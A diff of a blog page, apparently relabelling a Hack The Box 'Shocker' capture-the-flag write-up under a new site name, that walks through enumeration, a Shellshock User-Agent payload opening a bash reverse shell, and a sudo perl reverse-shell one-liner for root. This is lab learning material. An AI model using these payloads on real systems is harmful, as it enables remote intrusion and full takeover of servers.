@@ -1,259 +1,228 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    
-      <title>
-        Bash and the Shellshock ⚡️ ::
-        bhavsec — portfolio &amp; blog
-      </title>
-    
-    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<meta
-  name="description"
-  content="Introduction to ShellShock ShellShock Vulnerability [CVE-2014-6271], also known as Bashdoor, is a family of security bugs in the Unix Bash shell, the first of which was disclosed on 24 September 2014. Shellshock could enable an attacker to cause Bash to execute arbitrary commands and gain unauthorized access to many Internet-facing services, such as web servers, that use Bash to process requests.
-Shellshock is a privilege escalation vulnerability that offers a way for users of a system to execute commands that should be unavailable to them."
-/>
-<meta
-  name="keywords"
-  content="bhavsec, cybersecurity, penetration testing"
-/>
-<meta name="robots" content="noodp" />
-<link rel="canonical" href="https://bhavsec.com/posts/shellshock/" />
 
-
-
-
-
-<link rel="stylesheet" href="../../assets/style.css" />
-
-<link rel="stylesheet" href="../../style.css" />
-
-
-<link
-  rel="apple-touch-icon-precomposed"
-  sizes="144x144"
-  href="../../img/apple-touch-icon-144-precomposed.png"
-/>
-<link rel="shortcut icon" href="../../img/favicon.png" />
-
-
-<link href="../../assets/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
-<link href="../../assets/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
-<link href="../../assets/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
-<link href="../../assets/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
-<link href="../../assets/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
-<link href="../../assets/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
-
-
-<meta name="twitter:card" content="summary_large_image"/>
-<meta name="twitter:image" content="https://bhavsec.com/img/cover.png"/>
-
-<meta name="twitter:title" content="Bash and the Shellshock ⚡️"/>
-<meta name="twitter:description" content="Introduction to ShellShock ShellShock Vulnerability [CVE-2014-6271], also known as Bashdoor, is a family of security bugs in the Unix Bash shell, the first of which was disclosed on 24 September 2014. Shellshock could enable an attacker to cause Bash to execute arbitrary commands and gain unauthorized access to many Internet-facing services, such as web servers, that use Bash to process requests.
-Shellshock is a privilege escalation vulnerability that offers a way for users of a system to execute commands that should be unavailable to them."/>
-
-
-
-<meta property="og:title" content="Bash and the Shellshock ⚡️" />
-<meta property="og:description" content="Introduction to ShellShock ShellShock Vulnerability [CVE-2014-6271], also known as Bashdoor, is a family of security bugs in the Unix Bash shell, the first of which was disclosed on 24 September 2014. Shellshock could enable an attacker to cause Bash to execute arbitrary commands and gain unauthorized access to many Internet-facing services, such as web servers, that use Bash to process requests.
+<head>
+  <title>Bash and the Shellshock ⚡️ —  Waseem Akram</title>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="description"
+    content="Introduction to ShellShock ShellShock Vulnerability [CVE-2014-6271], also known as Bashdoor, is a family of security bugs in the Unix Bash shell, the first of which was disclosed on 24 September 2014. Shellshock could enable an attacker to cause Bash to execute arbitrary commands and gain unauthorized access to many Internet-facing services, such as web servers, that use Bash to process requests.
 Shellshock is a privilege escalation vulnerability that offers a way for users of a system to execute commands that should be unavailable to them." />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="https://bhavsec.com/posts/shellshock/" /><meta property="og:image" content="https://bhavsec.com/img/cover.png"/><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2021-07-14T00:00:00&#43;00:00" />
-<meta property="article:modified_time" content="2021-07-14T00:00:00&#43;00:00" /><meta property="og:site_name" content="bhavsec" />
+  <meta name="keywords" content="hackerwasii, cybersecurity, penetration testing" />
+  <meta name="robots" content="noodp" />
+  <link rel="canonical" href="https://www.hackerwasii.com/posts/shellshock/" />
 
+  <link rel="stylesheet" href="../../assets/style.css" />
 
+  <link rel="stylesheet" href="../../style.css" />
 
+  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="../../img/apple-touch-icon-144-precomposed.png" />
+  <link rel="shortcut icon" href="../../img/favicon.png" />
 
+  <link href="../../assets/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="" />
+  <link href="../../assets/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="" />
+  <link href="../../assets/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="" />
+  <link href="../../assets/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="" />
+  <link href="../../assets/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="" />
+  <link href="../../assets/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="" />
 
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:image" content="https://www.hackerwasii.com/img/cover.png" />
 
+  <meta name="twitter:title" content="Bash and the Shellshock ⚡️" />
+  <meta name="twitter:description"
+    content="Introduction to ShellShock ShellShock Vulnerability [CVE-2014-6271], also known as Bashdoor, is a family of security bugs in the Unix Bash shell, the first of which was disclosed on 24 September 2014. Shellshock could enable an attacker to cause Bash to execute arbitrary commands and gain unauthorized access to many Internet-facing services, such as web servers, that use Bash to process requests.
+Shellshock is a privilege escalation vulnerability that offers a way for users of a system to execute commands that should be unavailable to them." />
 
-  </head>
-  <body class="">
-    <div class="container">
-      <header class="header">
-  <span class="header__inner">
-    <a
-  href="http://bhavsec.com/"
-  class="logo"
-  style="text-decoration: none;"
->
-  
-    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
-  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
-</svg>
-</span>
-    <span class="logo__text">
-      bhavsec/</span>
-    <span class="logo__text" style="color:red">posts/</span>
-    <span class="logo__cursor"></span>
+  <meta property="og:title" content="Bash and the Shellshock ⚡️" />
+  <meta property="og:description"
+    content="Introduction to ShellShock ShellShock Vulnerability [CVE-2014-6271], also known as Bashdoor, is a family of security bugs in the Unix Bash shell, the first of which was disclosed on 24 September 2014. Shellshock could enable an attacker to cause Bash to execute arbitrary commands and gain unauthorized access to many Internet-facing services, such as web servers, that use Bash to process requests.
+Shellshock is a privilege escalation vulnerability that offers a way for users of a system to execute commands that should be unavailable to them." />
+  <meta property="og:type" content="article" />
+  <meta property="og:url" content="https://www.hackerwasii.com/posts/shellshock/" />
+  <meta property="og:image" content="https://www.hackerwasii.com/img/cover.png" />
+  <meta property="article:section" content="posts" />
+  <meta property="article:published_time" content="2021-07-14T00:00:00&#43;00:00" />
+  <meta property="article:modified_time" content="2021-07-14T00:00:00&#43;00:00" />
+  <meta property="og:site_name" content="hackerwasii" />
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-0PCVFG8BNK"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
 
-  
-</a>
+    function gtag() {
+      dataLayer.push(arguments);
+    }
+    gtag('js', new Date());
 
-    <span class="header__right">
-      
-        <nav class="menu">
-  <ul class="menu__inner menu__inner--desktop">
-    
-      
-        
-          <li><a href="../../resume">📄 resume</a></li>
-        
-      
-        
-          <li><a href="../../posts">📚 blog</a></li>
-        
-      
-        
-          <li><a href="../../whoami">🔎 whoami </a></li>
-        
-      
-        
-          <li><a href="../../resources">🚀 resources</a></li>
-        
-      
-      
-      
-  </ul>
+    gtag('config', 'G-0PCVFG8BNK');
+  </script>
+  <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9670252621494000"
+    crossorigin="anonymous"></script>
+</head>
 
-  <ul class="menu__inner menu__inner--mobile">
-    
-      
-        <li><a href="../../resume">📄 resume</a></li>
-      
-    
-      
-        <li><a href="../../posts">📚 blog</a></li>
-      
-    
-      
-        <li><a href="../../whoami">🔎 whoami </a></li>
-      
-    
-      
-        <li><a href="../../resources">🚀 resources</a></li>
-      
-    
-  </ul>
-</nav>
+<body class="">
+  <div class="container">
+    <header class="header">
+      <span class="header__inner">
+        <a href="https://www.hackerwasii.com/" class="logo" style="text-decoration: none">
+          <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+              <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+            </svg>
+          </span>
+          <span class="logo__text"> wasii/</span>
+          <span class="logo__text" style="color: red">posts/</span>
+          <span class="logo__cursor"></span>
+        </a>
 
-        <span class="menu-trigger">
-          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
-            <path d="M0 0h24v24H0z" fill="none" />
-            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
-          </svg>
-        </span>
-      
-      <span class="theme-toggle">
-        <svg
-  class="theme-toggler"
-  width="24"
-  height="24"
-  viewBox="0 0 48 48"
-  fill="none"
-  xmlns="http://www.w3.org/2000/svg"
->
-  <path
-    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+        <span class="header__right">
+          <nav class="menu">
+            <ul class="menu__inner menu__inner--desktop">
+              <li><a href="../../resume">📄 resume</a></li>
+
+              <li><a href="../../posts">📚 blog</a></li>
+
+              <li><a href="../../whoami">🔎 whoami </a></li>
+
+              <li><a href="../../resources">🚀 resources</a></li>
+            </ul>
+
+            <ul class="menu__inner menu__inner--mobile">
+              <li><a href="../../resume">📄 resume</a></li>
+
+              <li><a href="../../posts">📚 blog</a></li>
+
+              <li><a href="../../whoami">🔎 whoami </a></li>
+
+              <li><a href="../../resources">🚀 resources</a></li>
+            </ul>
+          </nav>
+
+          <span class="menu-trigger">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+              <path d="M0 0h24v24H0z" fill="none" />
+              <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
+            </svg>
+          </span>
+
+          <span class="theme-toggle">
+            <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none"
+              xmlns="http://www.w3.org/2000/svg">
+              <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
-  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
-  />
-</svg>
-
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z" />
+            </svg>
+          </span>
+        </span>
       </span>
-    </span>
-  </span>
-</header>
+    </header>
 
+    <div class="content">
+      <div class="post">
+        <h1 class="post-title">Bash and the Shellshock ⚡️</h1>
+        <div class="post-meta">
+          <span class="post-date"> 2021-07-14 </span>
+        </div>
 
-      <div class="content">
-        
-  
-  
+        <span class="post-tags">
+          <a href="../../tags/bash/index.html">#bash</a>&nbsp;
 
-  <div class="post">
-    <h1 class="post-title">Bash and the Shellshock ⚡️</h1>
-    <div class="post-meta">
-      
-        <span class="post-date">
-          2021-07-14
+          <a href="../../tags/cve/index.html">#cve</a>&nbsp;
+
+          <a href="../../tags/htb/index.html">#htb</a>&nbsp;
+
+          <a href="../../tags/burp/index.html">#burp</a>&nbsp;
+
+          <a href="../../tags/vulnerability/index.html">#vulnerability</a>&nbsp;
         </span>
 
-        
-          
-        
-      
+        <div class="post-content">
+          <h2>Table of Contents</h2>
+          <aside class="table-of-contents">
+            <nav id="TableOfContents">
+              <ul>
+                <li>
+                  <a href="index.html#introduction-to-shellshock">Introduction to ShellShock</a>
+                </li>
+                <li>
+                  <a href="index.html#reconnaissance">Reconnaissance</a>
+                  <ul>
+                    <li><a href="index.html#nmap-scan">Nmap Scan</a></li>
+                  </ul>
+                </li>
+                <li>
+                  <a href="index.html#enumeration">Enumeration</a>
+                  <ul>
+                    <li>
+                      <a href="index.html#directory-bruteforcing">Directory Bruteforcing</a>
+                    </li>
+                    <li>
+                      <a href="index.html#finding-files-in-cgi-bin-directory">Finding files in cgi-bin directory</a>
+                    </li>
+                    <li>
+                      <a href="index.html#intercepting-the-server-responses-with-burpsuite">Intercepting the Server
+                        responses with burpsuite</a>
+                    </li>
+                  </ul>
+                </li>
+                <li>
+                  <a href="index.html#gaining-an-initial-foothold">Gaining an Initial Foothold</a>
+                </li>
+                <li>
+                  <a href="index.html#privilege-escalation">Privilege Escalation</a>
+                </li>
+                <li>
+                  <a href="index.html#lessons-i-learned">Lessons I learned</a>
+                </li>
+              </ul>
+            </nav>
+          </aside>
 
-      
-
-
-      
-    </div>
-
-    
-      <span class="post-tags">
-        
-          <a href="../../tags/bash/index.html">#bash</a>&nbsp;
-        
-          <a href="../../tags/cve/index.html">#cve</a>&nbsp;
-        
-          <a href="../../tags/htb/index.html">#htb</a>&nbsp;
-        
-          <a href="../../tags/burp/index.html">#burp</a>&nbsp;
-        
-          <a href="../../tags/vulnerability/index.html">#vulnerability</a>&nbsp;
-        
-      </span>
-    
-
-    
-
-    <div class="post-content">
-      
-        
-        <h2>Table of Contents</h2>
-        <aside class="table-of-contents"><nav id="TableOfContents">
-  <ul>
-    <li><a href="index.html#introduction-to-shellshock">Introduction to ShellShock</a></li>
-    <li><a href="index.html#reconnaissance">Reconnaissance</a>
-      <ul>
-        <li><a href="index.html#nmap-scan">Nmap Scan</a></li>
-      </ul>
-    </li>
-    <li><a href="index.html#enumeration">Enumeration</a>
-      <ul>
-        <li><a href="index.html#directory-bruteforcing">Directory Bruteforcing</a></li>
-        <li><a href="index.html#finding-files-in-cgi-bin-directory">Finding files in cgi-bin directory</a></li>
-        <li><a href="index.html#intercepting-the-server-responses-with-burpsuite">Intercepting the Server responses with burpsuite</a></li>
-      </ul>
-    </li>
-    <li><a href="index.html#gaining-an-initial-foothold">Gaining an Initial Foothold</a></li>
-    <li><a href="index.html#privilege-escalation">Privilege Escalation</a></li>
-    <li><a href="index.html#lessons-i-learned">Lessons I learned</a></li>
-  </ul>
-</nav></aside>
-        
-      
-      <p> </p>
-<h2 id="introduction-to-shellshock">Introduction to ShellShock</h2>
-<p>ShellShock Vulnerability [CVE-2014-6271], also known as Bashdoor, is a family of security bugs in the Unix Bash shell, the first of which was disclosed on 24 September 2014. Shellshock could enable an attacker to cause Bash to execute arbitrary commands and gain unauthorized access to many Internet-facing services, such as web servers, that use Bash to process requests.</p>
-<p>Shellshock is a privilege escalation vulnerability that offers a way for users of a system to execute commands that should be unavailable to them. This happens through Bash&rsquo;s &ldquo;function export&rdquo; feature, whereby command scripts created in one running instance of Bash can be shared with subordinate instances.</p>
-<p>Therefore, an attacker can execute arbitrary commands on the system or exploit other bugs that may exist in Bash&rsquo;s command interpreter, if the attacker has a way to manipulate the environment variable list and then cause Bash to run.</p>
-<p>&ndash; <a href="https://en.wikipedia.org/wiki/Shellshock_(software_bug)">Wikipedia</a></p>
-<p> </p>
-<h2 id="reconnaissance">Reconnaissance</h2>
-<h3 id="nmap-scan">Nmap Scan</h3>
-<p>Let&rsquo;s begin with nmap.</p>
-<pre><code>nmap -sC -sV -oA nmap/shocker shocker.htb
-</code></pre><p>The flags breakdown as follows:</p>
-<ul>
-<li>-sC : Run all default scripts</li>
-<li>-sV : Enumerate versions of software running on found ports</li>
-<li>-oA : Save the output of the scan in all available formats</li>
-</ul>
-<pre><code># Nmap 7.91 scan initiated Fri Jul  2 15:37:47 2021 as: nmap -sC -sV -oA nmap/shocker 10.129.126.153
+          <p> </p>
+          <h2 id="introduction-to-shellshock">Introduction to ShellShock</h2>
+          <p>
+            ShellShock Vulnerability [CVE-2014-6271], also known as Bashdoor,
+            is a family of security bugs in the Unix Bash shell, the first of
+            which was disclosed on 24 September 2014. Shellshock could enable
+            an attacker to cause Bash to execute arbitrary commands and gain
+            unauthorized access to many Internet-facing services, such as web
+            servers, that use Bash to process requests.
+          </p>
+          <p>
+            Shellshock is a privilege escalation vulnerability that offers a
+            way for users of a system to execute commands that should be
+            unavailable to them. This happens through Bash&rsquo;s
+            &ldquo;function export&rdquo; feature, whereby command scripts
+            created in one running instance of Bash can be shared with
+            subordinate instances.
+          </p>
+          <p>
+            Therefore, an attacker can execute arbitrary commands on the
+            system or exploit other bugs that may exist in Bash&rsquo;s
+            command interpreter, if the attacker has a way to manipulate the
+            environment variable list and then cause Bash to run.
+          </p>
+          <p>
+            &ndash;
+            <a href="https://en.wikipedia.org/wiki/Shellshock_(software_bug)">Wikipedia</a>
+          </p>
+          <p> </p>
+          <h2 id="reconnaissance">Reconnaissance</h2>
+          <h3 id="nmap-scan">Nmap Scan</h3>
+          <p>Let&rsquo;s begin with nmap.</p>
+          <pre><code>nmap -sC -sV -oA nmap/shocker shocker.htb
+</code></pre>
+          <p>The flags breakdown as follows:</p>
+          <ul>
+            <li>-sC : Run all default scripts</li>
+            <li>
+              -sV : Enumerate versions of software running on found ports
+            </li>
+            <li>
+              -oA : Save the output of the scan in all available formats
+            </li>
+          </ul>
+          <pre><code># Nmap 7.91 scan initiated Fri Jul  2 15:37:47 2021 as: nmap -sC -sV -oA nmap/shocker 10.129.126.153
 Nmap scan report for 10.129.126.153
 Host is up (0.020s latency).
 Not shown: 998 closed ports
@@ -270,26 +239,35 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Fri Jul  2 15:37:54 2021 -- 1 IP address (1 host up) scanned in 7.83 seconds
-</code></pre><p>We get back the following result showing that two ports are open:</p>
-<ul>
-<li>Port 80: running Apache httpd 2.4.18</li>
-<li>Port 2222: running OpenSSH 7.2p2</li>
-</ul>
-<p> </p>
-<h2 id="enumeration">Enumeration</h2>
-<p>Visited the website on port 80 and we get a page that does not have links to any other pages. Therefore, we’ll run <a href="https://github.com/ffuf/ffuf">ffuf tool</a> to enumerate directories.</p>
-<h3 id="directory-bruteforcing">Directory Bruteforcing</h3>
-<pre><code>ffuf -c -r -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://shocker.htb/FUZZ/ 
-</code></pre><p>The flags breakdown as follows:</p>
-<ul>
-<li>-c   : add color to output</li>
-<li>-r   : follow redirects</li>
-<li>-t   : timeout in seconds</li>
-<li>-w   : path to wordlist</li>
-<li>-u   : URL of website</li>
-<li>FUZZ : Parameter for fuzzing in exact location</li>
-</ul>
-<pre><code>________________________________________________
+</code></pre>
+          <p>
+            We get back the following result showing that two ports are open:
+          </p>
+          <ul>
+            <li>Port 80: running Apache httpd 2.4.18</li>
+            <li>Port 2222: running OpenSSH 7.2p2</li>
+          </ul>
+          <p> </p>
+          <h2 id="enumeration">Enumeration</h2>
+          <p>
+            Visited the website on port 80 and we get a page that does not
+            have links to any other pages. Therefore, we’ll run
+            <a href="https://github.com/ffuf/ffuf">ffuf tool</a> to enumerate
+            directories.
+          </p>
+          <h3 id="directory-bruteforcing">Directory Bruteforcing</h3>
+          <pre><code>ffuf -c -r -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://shocker.htb/FUZZ/ 
+</code></pre>
+          <p>The flags breakdown as follows:</p>
+          <ul>
+            <li>-c : add color to output</li>
+            <li>-r : follow redirects</li>
+            <li>-t : timeout in seconds</li>
+            <li>-w : path to wordlist</li>
+            <li>-u : URL of website</li>
+            <li>FUZZ : Parameter for fuzzing in exact location</li>
+          </ul>
+          <pre><code>________________________________________________
 
  :: Method           : GET
  :: URL              : http://shocker.htb/FUZZ/
@@ -304,14 +282,36 @@ ________________________________________________
 cgi-bin/                [Status: 403, Size: 295, Words: 22, Lines: 12]
 icons                   [Status: 403, Size: 292, Words: 22, Lines: 12]
 ...
-</code></pre><p>This leads us to another dead end. It only discovered one directory that we don’t have access to.</p>
-<p><img src="http://bhavsec.com/img/posts/shellshock/1.png" alt=""></p>
-<p>According to the name of the machine, I have a suspicion that it is vulnerable to the Shellshock bash remote code execution vulnerability. This vulnerability affected web servers utilizing CGI (Common Gateway Interface), which is a system for generating dynamic web content. This usually involved directories such as <code>/cgi-sys, /cgi-mod, /cgi-bin</code> etc.</p>
-<p>Now we need to enumerate more on the <code>../cgi-bin/</code> directory. weI’ll look for files with extensions “txt, php, sh, pl”. we&rsquo;ll use <code>-e</code> flag to fuzz for files ending with given extensions.</p>
-<p> </p>
-<h3 id="finding-files-in-cgi-bin-directory">Finding files in cgi-bin directory</h3>
-<pre><code>ffuf -c -r -t 200 -e .txt,.php,.sh,.pl -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://shocker.htb/cgi-bin/FUZZ/
-</code></pre><pre><code>________________________________________________
+</code></pre>
+          <p>
+            This leads us to another dead end. It only discovered one
+            directory that we don’t have access to.
+          </p>
+          <p>
+            <img src="https://www.hackerwasii.com/img/posts/shellshock/1.png" alt="" />
+          </p>
+          <p>
+            According to the name of the machine, I have a suspicion that it
+            is vulnerable to the Shellshock bash remote code execution
+            vulnerability. This vulnerability affected web servers utilizing
+            CGI (Common Gateway Interface), which is a system for generating
+            dynamic web content. This usually involved directories such as
+            <code>/cgi-sys, /cgi-mod, /cgi-bin</code> etc.
+          </p>
+          <p>
+            Now we need to enumerate more on the
+            <code>../cgi-bin/</code> directory. weI’ll look for files with
+            extensions “txt, php, sh, pl”. we&rsquo;ll use
+            <code>-e</code> flag to fuzz for files ending with given
+            extensions.
+          </p>
+          <p> </p>
+          <h3 id="finding-files-in-cgi-bin-directory">
+            Finding files in cgi-bin directory
+          </h3>
+          <pre><code>ffuf -c -r -t 200 -e .txt,.php,.sh,.pl -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://shocker.htb/cgi-bin/FUZZ/
+</code></pre>
+          <pre><code>________________________________________________
 
  :: Method           : GET
  :: URL              : http://shocker.htb/cgi-bin/FUZZ/
@@ -326,18 +326,31 @@ ________________________________________________
 
 user.sh                 [Status: 200, Size: 118, Words: 19, Lines: 8]
 ..
-</code></pre><p>I get back a bash script (user.sh). When I visit the URL, it prompts me to download the file. Opening the downloaded &lsquo;user.sh&rsquo; file shows us the following content.</p>
-<pre><code>Content-Type: text/plain
+</code></pre>
+          <p>
+            I get back a bash script (user.sh). When I visit the URL, it
+            prompts me to download the file. Opening the downloaded
+            &lsquo;user.sh&rsquo; file shows us the following content.
+          </p>
+          <pre><code>Content-Type: text/plain
 
 Just an uptime test script
 
  16:09:25 up  1:02,  0 users,  load average: 0.00, 0.00, 0.00
-</code></pre><p> </p>
-<h3 id="intercepting-the-server-responses-with-burpsuite">Intercepting the Server responses with burpsuite</h3>
-<p>Let&rsquo;s check what&rsquo;s happening behind the website. Go to <code>Proxy &gt; Options &gt; Intercept Server Responses</code>.</p>
-<p><img src="http://bhavsec.com/img/posts/shellshock/2.png" alt=""></p>
-<p>Now intercept the request.</p>
-<pre><code>HTTP/1.1 200 OK
+</code></pre>
+          <p> </p>
+          <h3 id="intercepting-the-server-responses-with-burpsuite">
+            Intercepting the Server responses with burpsuite
+          </h3>
+          <p>
+            Let&rsquo;s check what&rsquo;s happening behind the website. Go to
+            <code>Proxy &gt; Options &gt; Intercept Server Responses</code>.
+          </p>
+          <p>
+            <img src="https://www.hackerwasii.com/img/posts/shellshock/2.png" alt="" />
+          </p>
+          <p>Now intercept the request.</p>
+          <pre><code>HTTP/1.1 200 OK
 Date: Fri, 02 Jul 2021 15:45:47 GMT
 Server: Apache/2.4.18 (Ubuntu)
 Connection: close
@@ -347,151 +360,186 @@ Content-Length: 119
 Content-Type: text/plain
 Just an uptime test script
 19:50:51 up 29 min,  0 users,  load average: 0.00, 0.00, 0.00
-</code></pre><p>Let’s try to see if it is vulnerable to shellshock. Send it to repeater for further testing.</p>
-<p> </p>
-<h2 id="gaining-an-initial-foothold">Gaining an Initial Foothold</h2>
-<p>I googled “shellshock reverse shell” and found some information explaining how to exploit the shellshock vulnerability to get a reverse shell on the system the web server is running on.</p>
-<p>Replace the User Agent field with this string in Burp. Make sure to replace the IP Address and port number.</p>
-<pre><code>User-Agent: () { ignored;};/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.172/4444 0&gt;&amp;1
-</code></pre><p>Then start up a listener on your attacker machine.</p>
-<pre><code>nc -nlvp 4444
-</code></pre><p>Go to Burp and execute the request.</p>
-<p><img src="http://bhavsec.com/img/posts/shellshock/3.png" alt=""></p>
-<p>Burp won&rsquo;t give you a response if the exploit successfully worked. Let&rsquo;s Go back to the listener and check if we got the shell.</p>
-<p><img src="http://bhavsec.com/img/posts/shellshock/4.png" alt=""></p>
-<p> </p>
-<h2 id="privilege-escalation">Privilege Escalation</h2>
-<p>Running the following command will show what commands we can run on the system as a low privileged user.</p>
-<pre><code>sudo -l
-</code></pre><p>Response:</p>
-<pre><code>Matching Defaults entries for shelly on Shocker:
+</code></pre>
+          <p>
+            Let’s try to see if it is vulnerable to shellshock. Send it to
+            repeater for further testing.
+          </p>
+          <p> </p>
+          <h2 id="gaining-an-initial-foothold">
+            Gaining an Initial Foothold
+          </h2>
+          <p>
+            I googled “shellshock reverse shell” and found some information
+            explaining how to exploit the shellshock vulnerability to get a
+            reverse shell on the system the web server is running on.
+          </p>
+          <p>
+            Replace the User Agent field with this string in Burp. Make sure
+            to replace the IP Address and port number.
+          </p>
+          <pre><code>User-Agent: () { ignored;};/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.172/4444 0&gt;&amp;1
+</code></pre>
+          <p>Then start up a listener on your attacker machine.</p>
+          <pre><code>nc -nlvp 4444
+</code></pre>
+          <p>Go to Burp and execute the request.</p>
+          <p>
+            <img src="https://www.hackerwasii.com/img/posts/shellshock/3.png" alt="" />
+          </p>
+          <p>
+            Burp won&rsquo;t give you a response if the exploit successfully
+            worked. Let&rsquo;s Go back to the listener and check if we got
+            the shell.
+          </p>
+          <p>
+            <img src="https://www.hackerwasii.com/img/posts/shellshock/4.png" alt="" />
+          </p>
+          <p> </p>
+          <h2 id="privilege-escalation">Privilege Escalation</h2>
+          <p>
+            Running the following command will show what commands we can run
+            on the system as a low privileged user.
+          </p>
+          <pre><code>sudo -l
+</code></pre>
+          <p>Response:</p>
+          <pre><code>Matching Defaults entries for shelly on Shocker:
     env_reset, mail_badpass,
     secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
 User shelly may run the following commands on Shocker:
     (root) NOPASSWD: /usr/bin/perl
-</code></pre><pre><code>ls -la /usr/bin/perl
+</code></pre>
+          <pre><code>ls -la /usr/bin/perl
 -rwxr-xr-x 2 root root 1907192 Mar 13  2016 /usr/bin/perl
-</code></pre><p>umm, I can run perl on the system using sudo. If I use perl with sudo privileges to send a reverse shell back to my machine it will get executed with root privileges.</p>
-<p>Go to <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">pentest monkey</a> and grab the perl code for a reverse shell.</p>
-<pre><code>sudo /usr/bin/perl -e 'use Socket;$i=&quot;10.10.14.172&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};'
-</code></pre><p>Before we execute the code, start up a listener on our attack machine.</p>
-<pre><code>nc -nlvp 4444
-</code></pre><p>Execute the code and we have root!</p>
-<p><img src="http://bhavsec.com/img/posts/shellshock/5.png" alt=""></p>
-<p> </p>
-<h2 id="lessons-i-learned">Lessons I learned</h2>
-<ul>
-<li>
-<p>I was stucked while enumerating the cgi-bin directory. While enumerating the directory the tool was not putting &ldquo;/&rdquo; at the end of the <code>../cgi-bin</code> directory. The server was interpreting it as a file instead of a directory and tool was showing 404 (resource not found).</p>
-</li>
-<li>
-<p>I usually use gobuster tool, but i realized the <a href="https://github.com/ffuf/ffuf">ffuf tool</a> is also a really good fuzzer. I learned the usage of this tool in deep. I&rsquo;ll try to make separate blog for this in future.</p>
-</li>
-<li>
-<p>The web server was executing bash commands on the remote system that was running a version of Bash that was vulnerable to the Shellshock vulnerability. This bug allowed us to gain access to the system. As a security or sys-admin we must know this vulnerability and keep the system up-to-date. Even popular shells like bash can be exploited.</p>
-</li>
-<li>
-<p>We should always give less privileges to users, Giving the sudo access permission to normal user to run perl command allowed me to escalate the privileges to root level.</p>
-</li>
-</ul>
-<p> </p>
-<p>Thanks for reading this post, if you like my work you can support by <a href="https://www.buymeacoffee.com/bhavsec">buying me a coffee</a>. ☕️</p>
+</code></pre>
+          <p>
+            umm, I can run perl on the system using sudo. If I use perl with
+            sudo privileges to send a reverse shell back to my machine it will
+            get executed with root privileges.
+          </p>
+          <p>
+            Go to
+            <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">pentest monkey</a>
+            and grab the perl code for a reverse shell.
+          </p>
+          <pre><code>sudo /usr/bin/perl -e 'use Socket;$i=&quot;10.10.14.172&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};'
+</code></pre>
+          <p>
+            Before we execute the code, start up a listener on our attack
+            machine.
+          </p>
+          <pre><code>nc -nlvp 4444
+</code></pre>
+          <p>Execute the code and we have root!</p>
+          <p>
